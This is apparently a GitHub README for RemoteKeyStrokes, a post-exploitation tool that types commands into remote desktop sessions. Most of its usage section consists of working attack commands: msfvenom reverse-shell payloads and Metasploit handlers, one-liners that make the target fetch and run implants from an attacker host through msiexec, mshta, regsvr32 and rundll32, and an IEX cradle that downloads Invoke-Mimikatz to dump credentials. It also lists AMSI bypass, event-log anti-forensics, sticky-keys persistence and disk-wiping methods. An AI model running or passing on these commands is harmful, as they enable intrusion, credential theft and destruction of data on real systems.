# Description

## Introduction

A script to automate keystrokes through an active remote desktop session that assists offensive operators in combination with living off the land techniques.

## About RemoteKeyStrokes

All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop.

## Features

- Executing commands
- File Transfer
- Privilege Escalation (Coming soon)
- Persistence (Coming soon)
- Anti-Forensics (Coming soon)

## Install Program

### Dependencies

For Debian-based distros.

```
$ sudo apt install -y xfreerdp-x11 xtightvncviewer xdotool
```

### Setup

Install the program in the system.

```
$ sudo wget -O /usr/local/bin/remotekeystrokes https://raw.githubusercontent.com/U53RW4R3/RemoteKeyStrokes/main/remotekeystrokes.sh && \
sudo ln -sf /usr/local/bin/remotekeystrokes /usr/local/bin/rks && \
sudo chmod 755 /usr/local/bin/remotekeystrokes /usr/local/bin/rks
```

## Help Menu

```
$ remotekeystrokes -h
Usage:
    remotekeystrokes <flags>

Flags:

COMMON OPTIONS:
    -c, --command <command | cmdfile>   Specify a command or a file containing to execute

    -p, --platform <operating_system>   Specify the operating system ("windows" is set by
                                        default if not specified)

    -w, --windowname <name>             Specify the window name for graphical remote
                                        program ("freerdp" is set by default if not
                                        specified)

    -h, --help                          Display this help message

UPLOAD FILES:
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

METHODS:
    -m, --method <method>               Specify a method. For command execution method
                                        "none" is set by default if not specified.
                                        For file transfer "pwshb64" is set by default
                                        if not specified. Other available methods are:
                                        "elevate", "persistence", "antiforensics", and
                                        "mayhem"

    -s, --submethod <submethod>         Specify a submethod from a method (applies with -m flag)

    -a, --action <action>               Specify an action from a submethod (applies with -s flag)

    -e, --evasion <evasion>             Specify an evasion method for uploading files (only works for "pwshb64")
```

## Usage

### 0x00 - Remote Authentication

#### RDP

- To authenticate modern operating systems specify the flag either to force authentication as TLS `/sec:tls` or authentication as NLA `/sec:nla`.

```
$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:<tls | nla> [/d:"<domain_name>"] /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>]
```

- To authenticate legacy operating systems specify the flag `/sec:rdp` to force old authentication.

```
$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:rdp [/d:"<domain_name>"] /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>]
```

#### VNC

- To remotely authenticate a VNC machine.

```
$ vncviewer -passwd password.txt <IP>::<PORT>
```

### 0x01 - Internal Reconnaissance

#### Command Prompt

- Local machine enumeration

```
$ cat recon_local_enum_cmds.txt
whoami /all
net user
net localgroup Administrators
ipconfig /all
systeminfo

$ rks -c "cmd.exe" -m dialogbox
[INFO] Checking one of the lines reaches 260 character limit
[PROG] Executing commands...
[DONE] Task completed!

$ rks -c recon_local_enum_cmds.txt
[PROG] Executing commands...
[DONE] Task completed!
```

- To execute a single command

```
$ rks -c "cmd.exe /k \"whoami /all & net user & net localgroup Administrators & ipconfig /all & systeminfo\"" -m dialogbox
[INFO] Checking one of the lines reaches 260 character limit
[PROG] Executing commands...
[DONE] Task completed!
```
- Active directory enumeration

```
$ cat recon_ad_enum_cmds.txt
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain

$ rks -c "cmd.exe" -m dialogbox
[INFO] Checking one of the lines reaches 260 character limit
[PROG] Executing commands...
[DONE] Task completed!

$ rks -c recon_ad_enum_cmds.txt
[PROG] Executing commands...
[DONE] Task completed!
```

To execute a single command.

```
$ rks -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & net group \"Domain Computers\" /domain\""
[INFO] Checking one of the lines reaches 260 character limit
[PROG] Executing commands...
[DONE] Task completed!
```

#### Powershell

Local machine enumeration (TODO)

```
$ cat recon_local_enum_cmdlets.txt

$ rks -c "powershell.exe" -m dialogbox

$ rks -c recon_local_enum_cmdlets.txt
```

Active directory enumeration (TODO)

```
$ cat recon_ad_enum_cmdlets.txt

$ rks -c "powershell.exe" -m dialogbox

$ rks -c recon_ad_enum_cmdlets.txt
```

### 0x02 - Execute Implant

#### Windows

Execute an implant while reading the contents of the payload in powershell.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh -o implant.ps1

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"

$ rks -c "powershell.exe" -m dialogbox

$ rks -c implant.ps1
```

Execute an powershell oneliner implant using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"

$ rks -c "cmd.exe" -m dialogbox

$ rks -c "powershell.exe -nop -w hidden -e <base64_payload>"
```

Execute an implant with `msiexec.exe` while hosting a webserver.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.msi

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"

$ sudo python -m http.server 80

$ rks -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi" -m dialogbox
```

Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.

```
$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"

$ rks -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m dialogbox
```

Execute an implant with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.

```
$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name implant.dll; set share data; exploit"

$ rks -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0" -m dialogbox
```

Execute an implant with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"

$ rks -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
```

#### Cross Platform

Execute and implant with `python` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"

$ rks -c "python -c \"<payload>\""
```

### 0x03 - File Transfer

There are 11 file transfer methods in total.

|     Method     |      Platform     | Description |
| -------------- | ----------------- | ----------- |
|   `pwshb64`    | Windows and Linux | Encodes the file into base64 then decodes it with powershell. |
|    `cmdb64`    |      Windows      | Uses `copy con` to output the encoded base64 file's content then decodes it with `CertUtil.exe`. |
|    `nixb64`    |       Unix        | Decodes base64 content into a file with `base64`. |
|   `outfile`    | Windows and Linux | Uses `Out-File` cmdlet to output the text file. |
|  `outfileb64`  |      Windows      | Uses `Out-File` cmdlet to output the encoded base64 file's content then decodes it with `CertUtil.exe`. |
|   `copycon`    |      Windows      | Uses `copy con` command to output the text file. |
|   `pwshhex`    | Windows and Linux | Encodes the file into hexadecimal then decodes it with powershell. |
|    `cmdhex`    |      Windows      | Outputting a hex encoded one liner in a variable then decodes it with `CertUtil.exe`. |
|  `copyconhex`  |      Windows      | Uses `copy con` to output the encoded hexdump file's content then decodes it with `CertUtil.exe`. |
|   `nixhex`     |       Unix        | Outputting a hex encoded one liner in a variable then decodes with with `echo -e` to interpret the `\x` sequence character.|
|  `outfilehex`  |      Windows      | Uses `Out-File` cmdlet to output the encoded hexdump file's content then decodes it with `CertUtil.exe`. |

Upload a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. This also includes droppers even if the size is large. Bear in mind it'll take time to complete the file transfer.

```
$ rks -c "powershell.exe" -m dialogbox

$ rks -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
[PROG] Transferring file...
[DONE] File transferred!
```

To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe
```

For powershell.

```
$ rks -c "powershell.exe" -m dialogbox

$ rks -i implant.exe -o implant.exe -m outfileb64
```

It's also possible for legacy operating systems to transfer files such as, **Windows XP** that lacks powershell except for command prompt.

```
$ rks -c "cmd.exe" -m dialogbox

$ rks -i implant.exe -o implant.exe -m cmdb64
```

Activate your C2 listener and execute the implant.

```
$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 4444; exploit"

$ rks -c ".\implant.exe"
```

Another way to transfer files especially for sysadmin and offensive tools. Let's take `PsExec64.exe` as an example to requires us for lateral movement. It'll take a long time to upload via text without interruption. Instead the fastest way is to mount the WebDAV that belongs to the legitimate website of sysinternals suite toolkit (`live.sysinternals.com`). Instead of using the file explorer which is much slower than executing commands. Here are the commands for command prompt.

```
$ cat commands.txt
net use z: \\live.sysinternals.com\tools
copy z:\PsExec64.exe .

$ rks -c "cmd.exe" -m dialogbox

$ rks -c commands.txt
```

Here's another variant for powershell cmdlets when transferring `PsExec64.exe` in Windows.

```
$ cat cmdlets.txt
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"
Copy-Item z:\PsExec64.exe .
Remove-PSDrive -Name Z

$ rks -c "powershell.exe" -m dialogbox

$ rks -c cmdlets.txt
```

The best way to retrieve fileless malware or offensive tools through powershell is by simply hosting/retrieving legitimate websites such as, `https://github.com` and executing it. Let's use `Invoke-Mimikatz` to retrieve credentials downloading and executing the cradle from [nishang](https://github.com/samratashok/nishang).

```
$ cat hashdump.txt
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

$ rks -c "powershell.exe" -m dialogbox

$ rks -c hashdump.txt
```

If you have large files that it's nearly impossible to wait for the file transfer to be finished. `xfreerdp` allows to mount a local directory with `/drive:/path/to/directory/` flag. Then navigate the file browser or shell prompt to `\\tsclient\<share_name>\` to view the contents.

```
$ mkdir Tools

$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe Tools/

$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:<tls | rdp | nla> [/d:"<domain_name>"] /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>] /drive:Tools

$ rks -c "cmd.exe" -m dialogbox

$ rks -c "dir \\tsclient\<share_name>\"
```

### 0x04 - Privilege Escalation

Note: WIP (Work In Progress)

```
$ rks -m elevate -s bypassuac -a info

$ rks -m elevate -s <sub_method>
```

### 0x05 - Persistence

Note: WIP (Work In Progress)

```
$ rks -m persistence -s createuser

$ rks -m persistence -s sethc
```

### 0x06 - Defense Evasion

Note: WIP (Work In Progress)

- You can combine AMSI Bypass with the powershell implant to circumvent **Windows Security** or any security solution that was integrated with AMSI scanner.

```
$ cat amsi_bypass.ps1

$ cat amsi_bypass.ps1 implant.ps1 > payload.ps1

$ rks -c "powershell.exe" -m dialogbox

$ rks -c payload.ps1
```

```
$ rks -m antiforensics -s wevutils

$ rks -m antiforensics -s winevent

$ rks -m antiforensics -s eventvwr
```

### 0x07 - Miscellaneous

Note: WIP (Work In Progress)

```
$ rks -m mayhem -s format -s diskpart -a info

$ rks -m mayhem -s format -s diskpart -a cmd

$ rks -m mayhem -s format -s diskpart -a pwsh
```

### 0x08 - Specify Grapical Remote Software

- If you're targeting VNC network protocols you can specify the window name with `tightvnc`.

```
$ rks -c implant.ps1 -w tightvnc
```

### 0x09 - FAQ

TODO: Fill this info

Q)

A) The techniques are common and can be reused for BadUSB or malware development.

## Troubleshooting

### Uninstall

To uninstall the programs.

```
$ sudo rm -f /usr/local/bin/remotekeystrokes /usr/local/bin/rks
```

## TODO and Help Wanted

- [ ] Rewrite the flag switches to minimize for reusability.

- [ ] Implement encryption method of AES256 via base64

- [ ] Implement a persistence function for both windows and linux.

- [ ] Implement antiforensics function for both windows and linux.

- [ ] Implement privesc function for both windows and linux

## References

- [Video: sethc.exe Backdoor CMD Payload delivery (USB Rubber Ducky style)](https://www.youtube.com/watch?v=8YFEujJUxws)

- [Original Script](https://github.com/nopernik/mytools/blob/master/rdp-cmd-delivery.sh)

- [VirtualRubberDucky](https://github.com/joewhaley/VirtualRubberDucky)

- [sticky_keys_hunter](https://github.com/ztgrace/sticky_keys_hunter)

## Credits

- [nopernik](https://github.com/nopernik)

## Disclaimer

It is your responsibility depending on whatever the cause of your actions user. Remember that with great power comes great responsibility.
